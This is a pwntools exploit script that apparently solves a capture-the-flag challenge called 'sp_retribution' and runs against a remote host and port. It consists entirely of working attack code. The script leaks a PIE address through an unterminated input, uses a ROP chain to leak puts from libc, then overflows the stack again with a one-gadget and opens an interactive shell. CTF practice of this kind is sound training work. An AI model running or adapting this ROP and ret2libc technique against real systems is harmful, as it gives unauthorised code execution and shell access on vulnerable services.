from pwn import *

#target = process('./sp_retribution')

#pid = gdb.attach(target, "\nb *missile_launcher+117\nb *missile_launcher+201\n set disassembly-flavor intel\ncontinue")

target = remote('46.101.27.51', 30236)

print(target.recvuntil(b'Change target\'s location'))

target.sendline(b'2')

print(target.recvuntil(b'Insert new coordinates: x ='))


payload1 = b'a' * (0x10 - 1)
target.sendline(payload1)

print(target.recvuntil(payload1 + b'\n'))

leak = target.recv(6)

print(leak)

leak_num = u64(leak+b'\x00'*2)
print(hex(leak_num))

main = leak_num - 0x13f
print('main is at', hex(main))


elf = ELF('sp_retribution')

pie_base = main - elf.symbols['main']
pop_rdi = pie_base + 0x0000000000000d33
puts_got = pie_base + elf.got['puts']
puts_plt = pie_base + elf.symbols['puts']


print(target.recvuntil(b'Verify'))

payload2 = cyclic(200)

padding = b'a' * 88
payload2 = padding
payload2 += p64(pop_rdi)
payload2 += p64(puts_got)
payload2 += p64(puts_plt)
payload2 += p64(main)

#payload2 = b'a' * 500
target.sendline(payload2)

print(target.recvuntil(b'reset!\x1b[1;34m\n'))

leak = target.recv(6)
puts_libc = u64(leak+b'\x00'*2)
print(hex(puts_libc))

libc = ELF('glibc/libc.so.6')

libc_base = puts_libc - libc.symbols['puts']
#Note: 44 bytes of overflow.
onegadget = libc_base + 0x45226
pop_rdx_rsi = libc_base + 0x00000000001151c9

#Round 2:

print(target.recvuntil(b'Change target\'s location'))
target.sendline(b'2')
print(target.recvuntil(b'Insert new coordinates: x ='))
payload1 = b'a' * (0x10 - 1)
target.sendline(payload1)
print(target.recvuntil(payload1 + b'\n'))


xor_rax = 0x000000000008b945 + libc_base
payload2 = padding + p64(xor_rax) + p64(onegadget)

target.sendline(payload2)


target.interactive()
